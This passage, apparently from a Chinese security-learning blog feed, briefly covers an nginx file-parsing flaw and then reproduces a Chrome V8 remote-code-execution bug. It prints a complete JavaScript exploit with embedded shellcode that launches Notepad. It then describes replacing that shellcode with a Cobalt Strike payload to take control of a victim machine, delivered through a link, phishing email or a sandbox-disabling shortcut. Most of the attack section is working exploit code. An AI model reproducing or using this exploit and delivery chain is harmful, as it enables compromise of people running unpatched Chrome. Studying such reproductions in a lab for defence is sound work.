title="2.解析漏洞"></a>2.解析漏洞</h4><p>1.什么是解析漏洞，例如.jpg格式的文件后有php代码，在访问图片的时候，随便访问一个aaa.php就可以执行php代码，这种解析漏洞在</p><p>ngnix中有，所以在信息搜集中，如果判断出服务器是ngnix,就可以试一下这种解析漏洞（可以用<?php phpinfo();?>）,国内网站轻易不要试。</p><h4 id="1-信息收集的重要性："><a href="#1-信息收集的重要性：" class="headerlink" title="1.信息收集的重要性："></a>1.信息收集的重要性：</h4><p>我一直没明白信息搜集的重要性，<strong>如果判断出服务器版本，就可以尝试有没有解析漏洞</strong>，慢慢来吧，后面实践多了兴许会发现信息搜集的重要性，判断出是否使用了cms系统也是，还有一些闭源系统，这些系统往往会有很多洞，还是要找一些信息搜集的知识看一看</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;“基本上所有的站，脚本类型文件后缀都不能上传”&lt;/p&gt;
&lt;h3 id=&quot;1-文件上传漏洞形成要素&quot;&gt;&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>chrome0day复现</title>
    <link href="http://example.com/2021/06/13/chrome0day%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/06/13/chrome0day%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-06-13T03:41:35.736Z</published>
    <updated>2021-06-13T03:50:51.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="chromeRCE复现"><a href="#chromeRCE复现" class="headerlink" title="chromeRCE复现"></a>chromeRCE复现</h1><h3 id="1-漏洞利用环境"><a href="#1-漏洞利用环境" class="headerlink" title="1.漏洞利用环境"></a>1.漏洞利用环境</h3><p>chrome版本小于等于89.0.4389.114，9.0也可以</p><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>1.点击链接，就可以直接上线</p><p>2.邮件钓鱼发送快捷方式</p><h3 id="3-漏洞利用条件"><a href="#3-漏洞利用条件" class="headerlink" title="3.漏洞利用条件"></a>3.漏洞利用条件</h3><p>1.chrome版本对应</p><p>2.必须关闭沙箱模式     - -no -sandbox</p><p>3.访问有payload的web页面</p><h3 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4.漏洞复现"></a>4.漏洞复现</h3><h4 id="1-打开记事本"><a href="#1-打开记事本" class="headerlink" title="1.打开记事本"></a>1.打开记事本</h4><p>利用代码：</p><p>[<a href="https://github.com/fengxuangit/ChromeRce]">https://github.com/fengxuangit/ChromeRce]</a>: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function gc() &#123;</span><br><span class="line">        for (var i = 0; i &lt; 0x80000; ++i) &#123;</span><br><span class="line">            var a = new ArrayBuffer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    let shellcode = [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,</span><br><span class="line">        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,</span><br><span class="line">        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,</span><br><span class="line">        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,</span><br><span class="line">        0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,</span><br><span class="line">        0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,</span><br><span class="line">        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,</span><br><span class="line">        0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,</span><br><span class="line">        0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,</span><br><span class="line">        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,</span><br><span class="line">        0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,</span><br><span class="line">        0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,</span><br><span class="line">        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,</span><br><span class="line">        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,</span><br><span class="line">        0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,</span><br><span class="line">        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,</span><br><span class="line">        0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,</span><br><span class="line">        0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00];</span><br><span class="line">    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);</span><br><span class="line">    var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">    var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">    var main = wasmInstance.exports.main;</span><br><span class="line">    var bf = new ArrayBuffer(8);</span><br><span class="line">    var bfView = new DataView(bf);</span><br><span class="line">    function fLow(f) &#123;</span><br><span class="line">        bfView.setFloat64(0, f, true);</span><br><span class="line">        return (bfView.getUint32(0, true));</span><br><span class="line">    &#125;</span><br><span class="line">    function fHi(f) &#123;</span><br><span class="line">        bfView.setFloat64(0, f, true);</span><br><span class="line">        return (bfView.getUint32(4, true))</span><br><span class="line">    &#125;</span><br><span class="line">    function i2f(low, hi) &#123;</span><br><span class="line">        bfView.setUint32(0, low, true);</span><br><span class="line">        bfView.setUint32(4, hi, true);</span><br><span class="line">        return bfView.getFloat64(0, true);</span><br><span class="line">    &#125;</span><br><span class="line">    function f2big(f) &#123;</span><br><span class="line">        bfView.setFloat64(0, f, true);</span><br><span class="line">        return bfView.getBigUint64(0, true);</span><br><span class="line">    &#125;</span><br><span class="line">    function big2f(b) &#123;</span><br><span class="line">        bfView.setBigUint64(0, b, true);</span><br><span class="line">        return bfView.getFloat64(0, true);</span><br><span class="line">    &#125;</span><br><span class="line">    class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">        constructor(size) &#123;</span><br><span class="line">            super(size);</span><br><span class="line">            this.slot = 0xb33f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function foo(a) &#123;</span><br><span class="line">        let x = -1;</span><br><span class="line">        if (a) x = 0xFFFFFFFF;</span><br><span class="line">        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));</span><br><span class="line">        arr.shift();</span><br><span class="line">        let local_arr = Array(2);</span><br><span class="line">        local_arr[0] = 5.1;//4014666666666666</span><br><span class="line">        let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8</span><br><span class="line">        arr[0] = 0x1122;</span><br><span class="line">        return [arr, local_arr, buff];</span><br><span class="line">    &#125;</span><br><span class="line">    for (var i = 0; i &lt; 0x10000; ++i)</span><br><span class="line">        foo(false);</span><br><span class="line">    gc(); gc();</span><br><span class="line">    [corrput_arr, rwarr, corrupt_buff] = foo(true);</span><br><span class="line">    corrput_arr[12] = 0x22444;</span><br><span class="line">    delete corrput_arr;</span><br><span class="line">    function setbackingStore(hi, low) &#123;</span><br><span class="line">        rwarr[4] = i2f(fLow(rwarr[4]), hi);</span><br><span class="line">        rwarr[5] = i2f(low, fHi(rwarr[5]));</span><br><span class="line">    &#125;</span><br><span class="line">    function leakObjLow(o) &#123;</span><br><span class="line">        corrupt_buff.slot = o;</span><br><span class="line">        return (fLow(rwarr[9]) - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    let corrupt_view = new DataView(corrupt_buff);</span><br><span class="line">    let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);</span><br><span class="line">    let idx0Addr = corrupt_buffer_ptr_low - 0x10;</span><br><span class="line">    let baseAddr = (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</span><br><span class="line">    let delta = baseAddr + 0x1c - idx0Addr;</span><br><span class="line">    if ((delta % 8) == 0) &#123;</span><br><span class="line">        let baseIdx = delta / 8;</span><br><span class="line">        this.base = fLow(rwarr[baseIdx]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let baseIdx = ((delta - (delta % 8)) / 8);</span><br><span class="line">        this.base = fHi(rwarr[baseIdx]);</span><br><span class="line">    &#125;</span><br><span class="line">    let wasmInsAddr = leakObjLow(wasmInstance);</span><br><span class="line">    setbackingStore(wasmInsAddr, this.base);</span><br><span class="line">    let code_entry = corrupt_view.getFloat64(13 * 8, true);</span><br><span class="line">    setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line">    for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    main();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>将代码写入一个html文件，关闭chrome的沙箱，用chrome访问该html文件，打开记事本，<strong>代表可以执行任意命令</strong></p><h5 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h5><p>1.关闭谷歌沙箱，在本机phpstudy把上面代码生成一个cs.html</p><p>2.用我的虚拟机访问本机phpstudy，弹出记事本</p><p><img src="/.com//cs1.PNG"></p><h4 id="2-上线Cobalt-Strike"><a href="#2-上线Cobalt-Strike" class="headerlink" title="2.上线Cobalt Strike"></a>2.上线Cobalt Strike</h4><p>1.安装cobalt strike</p><p>我用的是kali4.0和cs4.0安装</p><p>1.安装kali</p><p>参考链接：</p><p>[<a href="https://blog.csdn.net/weixin_43895765/article/details/104400419]">https://blog.csdn.net/weixin_43895765/article/details/104400419]</a>: </p><p> 2.在kali上部署cs服务端和本机启动客户端（如果关机kali，IP可能会变，所以客户端连接的时候要看下ip对不对）</p><h5 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h5><p>1.在cs上部署一个<strong>基于https的监听器</strong>，然后生成一段payload,把生成的payload中的\替换成，0，然后生成一段shellcode</p><p><img src="/.com//%E7%94%9F%E6%88%90payload.PNG"></p><p><img src="/.com//%E7%94%9F%E6%88%90payload2.PNG"></p><p>替换</p><p><img src="/.com//%E7%94%9F%E6%88%90shellcode.PNG"></p><p>生成shellcode</p><p><img src="/.com//%E6%9B%BF%E6%8D%A2shellcode.PNG"></p><p>保存到本机phpstudy为cs1.html,然后用虚拟机访问</p><p><img src="/.com//%E8%AE%BF%E9%97%AEcs1-1619194194537.PNG"></p><p>上线成功</p><p><img src="/.com//%E4%B8%8A%E7%BA%BF%E6%88%90%E5%8A%9F.PNG"></p><p>总结：</p><p>1.设置监听器的时候，<strong>要基于https，host是服务端的ip地址</strong>。</p><p>2.之前一直都没有上线成功，问了老师</p><p>（1）把32位和64位都尝试一下（我没上线不是这个原因）</p><p>（2）客户端和服务端没连通（我应该是这个问题）</p><h4 id="3-快捷方式"><a href="#3-快捷方式" class="headerlink" title="3.快捷方式"></a>3.快捷方式</h4><p>1.创建一个快捷方式，在属性关闭沙箱的参数后面把链接放到后面</p><p><img src="/.com//%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F1.PNG"></p><h4 id><a href="#" class="headerlink" title></a></h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;chromeRCE复现&quot;&gt;&lt;a href=&quot;#chromeRCE复现&quot; class=&quot;headerlink&quot; title=&quot;chromeRCE复现&quot;&gt;&lt;/a&gt;chromeRCE复现&lt;/h1&gt;&lt;h3 id=&quot;1-漏洞利用环境&quot;&gt;&lt;a href=&quot;#1-漏洞利用环境&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
